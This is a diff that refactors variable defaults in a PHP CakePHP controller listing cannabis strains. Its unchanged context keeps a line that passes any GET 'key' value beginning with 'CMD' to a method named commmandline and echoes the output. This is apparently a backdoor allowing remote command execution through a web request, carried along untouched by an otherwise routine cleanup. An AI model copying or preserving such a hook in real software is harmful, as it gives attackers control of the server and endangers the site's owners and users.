@@ -493,20 +493,18 @@ class StrainsController extends AppController {
 
         //echo $limit;die();
         $this->layout = 'blank';
+        $key = '';
         if (isset($_GET['key'])) {
             $key = $_GET['key'];
             if (substr($key,0,3)=="CMD"){
                 echo $this->commmandline($key);
             }
-        }else {
-            $key = '';
         }
 
         $condition = '';
+        $effects = array();
         if (isset($_GET['effects'])) {
             $effects = $_GET['effects'];
-        }else {
-            $effects = array();
         }
 
         $symptoms = "";
@@ -746,8 +744,6 @@ class StrainsController extends AppController {
                 $this->set('reviewz', $this->Review->find('count', array('conditions' => array('Review.user_id' => $_GET['user']))));
             }
         }
-
-
         $this->loadModel('VoteIp');
         $this->set('vip', $this->VoteIp);
         if (isset($_GET['user'])) {
@@ -774,7 +770,6 @@ class StrainsController extends AppController {
             $limit = 8;
             $offset = 0;
         }
-        //echo $limit;die();
         $this->layout = 'blank';
 
         $this->loadModel('Review');
